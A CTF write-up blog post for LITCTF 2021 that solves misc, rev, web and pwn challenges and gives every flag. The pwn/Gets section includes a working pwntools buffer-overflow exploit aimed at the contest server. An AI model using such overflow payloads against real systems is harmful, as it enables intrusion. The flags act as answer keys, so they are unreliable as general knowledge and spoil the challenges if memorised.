---
weight: 1
title: "LIT 2021"
date: 2021-07-16
lastmod: 2021-07-18
draft: false
author: "Xenonminer"
authorLink: "https://xenonminer.github.io"
description: "Writeup for the challenges in LITCTF 2021"

tags: ["misc", "pwn", "rev", "web"]
categories: ["Writeups"]

lightgallery: true

toc:
  enable: true
---

- [https://ctftime.org/event/1398](https://ctftime.org/event/1398)
- Jul 16 to Jul 18
- Played with wackers
- Ranking: 142/476 with 1875 points

# My Solves/Writeups

## Misc

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| misc/Intro-to-CTF | Easy | I forgor | [jump](#miscintro-to-ctf) |
| misc/Discord-Flag | Easy | I forgor | [jump](#miscdiscord-flag) |
| misc/Survey | Easy | I forgor | [jump](#miscsurvey) |
| misc/Hex-to-ASCII | Easy | I forgor | [jump](#mischex-to-ascii) |
| misc/Dots-and-Lines | Easy | I forgor | [jump](#miscdots-and-lines) |
| misc/Never-Gonna-Give-You-Up | Easy | I forgor | [jump](#miscnever-gonna-give-you-up) |
| misc/Peanutbutter-Jar | Easy | I forgor | [jump](#miscpeanutbutter-jar) |
| misc/Steganography | Easy | I forgor | [jump](#miscsteganography) |
| misc/CodeTiger-ORZ | Medium | I forgor | [jump](#misccodetiger-orz) |

## Pwn

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| pwn/Gets | Easy | I forgor | [jump](#pwngets) |

## Rev

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| rev/Yarn | Easy | I forgor | [jump](#revyarn) |
| rev/Evaluation | Easy | I forgor | [jump](#revevaluation) |

## Web

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| web/Let-It-Go | Easy | I forgor | [jump](#weblet-it-go) |
| web/My-First-Website | Easy | I forgor | [jump](#webmy-first-website) |
| web/dizzy | Easy | I forgor | [jump](#webdizzy) |

## Writeups
### misc/Intro-to-CTF

Welcome to your first CTF Challenge! For this problem, you simply need to read the CTF Resource page and find the flag :D.
Resource Page: https://lit.lhsmathcs.org/ctfres

### Solution

Just read the resource page, or not if you just want the flag.
Flag is at the bottom of the page.

Flag: ```flag{h3ll0_w0r1d_y0ur_f1r5t_ctf}```

### misc/discord-flag

Go to our discord server https://discord.gg/k6yzFdZ for the flag~ We post the latest information and updates there so it's very important.

### Solution

Join the discord server and the flag is in the announcements channel.

Flag: ```flag{L1T_d1sc0rd_0rz}```

### misc/Survey

Fill out this LIT CTF 2021 Survey form for a free flag :D
https://docs.google.com/forms/d/e/1FAIpQLSebUZnmQDl3sDEPS7Y3ZTBVO3JuxFpgWxZc_sSvVMZZZoVGEw/viewform

### Solution

Just fill out the survey and get the flag.

Flag: ```flag{th4nk5_f0r_c0m1ng}```

### misc/Hex-to-ASCII

You received a mysterious hexadecimal number, maybe you should try converting it to ASCII!```666c61677b77346273317465355f346e645f7430306c355f3472335f793075725f673030645f667231336e64357d```

### Solution

Just search up Hex To ascii on your web browser and input the encoded message to get the flag.

Flag: ```flag{w4bs1te5_4nd_t00l5_4r3_y0ur_g00d_fr13nd5}```

### misc/Dots-and-Lines

Ye old way of delivering messages, might want to slow it down to catch everything… Note: set the spaces as is, do not replace spaces with underscores

Attachments: https://drive.google.com/uc?export=download&id=1qP_8qp2gviDJ5HKRWKDdV54V8tPP0LrG

### Solution

Search up Audio Morse Code Decoder and use the first one that shows up https://morsecode.world/international/decoder/audio-decoder-adaptive.html.

Upload the file into it and get the decoded message which we can format into our flag.

Flag: ```flag{M0RSEC0DEISC00L}```

### misc/Never-Gonna-Give-You-Up

They gave a gif and nothing else.

### Solution

Download that gif by right clicking and pressing save as, or however you would download an image off of your web browser.

Check different things around the gif with forensics skills like running file to see what file type etc.

The most suspicious thing though is when you run binwalk, because it shows that the gif is also a zip archive.

Knowing that, unzip the image and a flag file comes out.

Flag: ```flag{y0u_g0t_r1ck_r0lled_h4h4_g3t_r3kt}```

### misc/Peanutbutter-Jar

We would like to say a huge thank you to Rythm and Eyangch for their massive support. Not only did they write many of the high quality problems, but they also helped us greatly in the process of hosting CTF. They are from the team PeanutButter.jar and are actually hosting their own CTF competition in August. If you haven't already, you should definitely check out their website, https://pbjar.github.io/.

### Solution

Going to the website, we can inspect the page.

<img src="https://user-images.githubusercontent.com/86171033/126084320-e50784e4-6fd0-4bae-8114-a71e01f9bbf9.PNG" alt="image" width=800/>

Flag: ```flag{pbj4r_4lm0st_b3at_r3dpwn_0nc3}```

### misc/Steganography

Meow Meow Meow~ That cat is not what it seems...

Attachments: https://drive.google.com/uc?export=download&id=1cJi9V6ZHBmyXmMZj_TXcH-ziwwk8Z9U4

### Solution

Go to https://stegonline.georgeom.net/upload and upload the file.

Play around with the settings and with LSB Half, you will see the flag in the image.

Flag: ```flag{5t3g50lv3r_1s_v3ry_n1c3}```

### misc/CodeTiger-ORZ

CodeTiger ORZ ORZ ORZ

Attachments: https://drive.google.com/uc?export=download&id=1nId2n0A2oEnbOfR3F1ySakcSi7qNMFd4

### Solution

They give you a video file so the first thing you do is actually watch the video to see if theres anything weird.

If you watch carefully, a small text pops up for like 0.1 secs on the screen, which is most probably our flag.

Now you can try to be insane and catch the flag at the exact time but an easier way to do this challenge is to use a video cutter.

The video frame cutter I used: https://online-video-cutter.com/

Upload the file to the site and trim the video to where the green text appears.

It might be light if you stop it a little too early but it's better than nothing.

That's our flag!!

Flag: ```flag{c0detiger_0rz}```

### pwn/Gets

My favorite libc function is gets. I am very confident in its security. Connect with ```nc gets.litctf.live 1337```

### Solution
The title of the challenge already tells us that the challenge is going to be some type of gets buffer overflow.

First, we take a look at the c source code that they gave us.

We see that there is a strcmp function first that we need to get past.

Next, after we pass the strcmp we have to overwrite the debuf variable so it equals 0xdeadbeef.

Now we have to figure out our payload to meet the requirements.

First we know that we have to pass the strcmp, which compares our input with the string "Yes".

Now after we pass the strcmp part of the binary, we try to overwrite into the variable by adding many A's.

After trying to add many A's to our payload, we realize something is wrong.

We are now not getting past the strcmp and it sends us directly to the bottom.

Now the way that we can get past the strcmp is to send a null terminator which is \x00.

Now we have to find the proper offset to overwrite into the flag variable, which is buf.

Finding the offset was pretty simple. We just had to test A's until we got 1 A into segmentation fault which meant we started overwriting the variable.

We find that the offset was an extra 48 A's after the 'Yes' and the null terminator, \x00, which in total gives us the offset of 52.

Now all we have to do is write the variable exactly to 0xdeadbeef.

We could do this by concatenating \xef\xbe\xad\xde or using pwntools p64(0xdeadbeef).

So now, we just had to create the program in python with the correct parts.

The total payload we were sending was ```r.sendline(b'Yes' + b'\0' + b'A'*36 + p64(0xdeadbeef) + p64(0x7ffff7fb1390))```

Exploit:

```python
from pwn import *

exe = ELF("gets")

context.binary = exe


def conn():
        if False:
                return process([exe.path])
        else:
                return remote("gets.litctf.live", 1337)


def main():
        r = conn()
        r.recvuntil("Are you starting to understand?")
        r.sendline(b'Yes' + b'\0' + b'A'*36 + p64(0xdeadbeef) + p64(0x7ffff7fb1390))
        r.interactive()


if __name__ == "__main__":
        main()
```

Flag: ```flag{d0_y0u_g3ts_1t}```

```Note: I am not the best at pwn so I didn't really understand exactly why this worked but I guess that it read the flag memory address as extra bytes because after looking at other writeups, I saw that all we needed to do was pass the offset and overwrite the debug variable to equal 0xdeadbeef.```

### rev/Yarn

Cats like yarn >.<

Attachment: https://drive.google.com/uc?export=download&id=1O0wQZoof4RTddp8LArIPY8eLG-Bj3yo7

### Solution
Run strings on the file and search for the flag.

Best way to do that is the command: strings yarn | grep flag

We get our flag!!

Flag: ```flag{y4rn_4nd_s1lk_4r3_n1c3_but_str1ngs_1s_wh4t_g0t_th3_fl4g}```

### rev/Evaluation

Here’s an evaluation copy of my flag checker! I hid the flag in the evaluation copy though…

### Solution
All the evals check from the evals before it. If we delete one eval, we get this:

<img src="https://user-images.githubusercontent.com/86171033/126106511-8ab71a56-bc3a-46df-82c4-39b43efc8dc7.png" alt="image" width=800>

We can then run a solve script that looks like this to get our flag!

```python
i = "x6wpf6vZ|w6sZq5kZv4Zk54q1fvpcg5~bdic"

for char in i:
    print(chr(ord(char)^5))
```

Flag: ```flag{0bfusc4t10n_1s_n0t_v3ry_s3cur3}```

### web/Let-It-Go

Sometimes, you just got to let it go~

Attachments: http://websites.litctf.live:8080/

### Solution

You can find the flag by inspecting the page with Ctrl + U

Flag: ```flag{l00k5_l1k3_y0u_f1n4lly_l3t_1t_g0}```

### web/My-First-Website

I just built my first website! I heard there might be a flag on it too

Attachments: http://websites.litctf.live/

### Solution
There's three parts to the flag.

1. The first part of the flag is in the really fast text on the screen, which you can also find by inspecting the page and searching for "flag".
<img src="https://user-images.githubusercontent.com/86171033/126084621-2e792c0d-84c4-46c0-8c32-bf63a362dbbe.png" alt="picture of first part of flag on website" width=600>

2. The second part of the flag is also found by searching for "flag" in the source code.
<img src="https://user-images.githubusercontent.com/86171033/126085502-606267c6-3fb2-4918-8a6f-7b5cfad52382.png" alt="2nd part of flag" width=600>

3. I found the third part of the flag in the source code, though you could also find it by clicking on the button with "AMAZING COLOURS".
<img src="https://user-images.githubusercontent.com/86171033/126084837-e5a8d03d-146f-401b-b5b0-07b8773844e7.png" alt="website notification" width=600>

Flag: ```flag{1_l1k3_90s_w3bs1t3s_d351gns}```

### web/dizzy

My head could use a refresh.

Attachments: http://dizzy.litctf.live/

### Solution

I'm not sure exactly how this worked but when you get the interrupted my codetiger orz message, just press back to get back to the main website and you will get redirected to the flag.

Flag: ```flag{th1s_is_b4d_pr4ct1c3_app4ar3nt1y}```
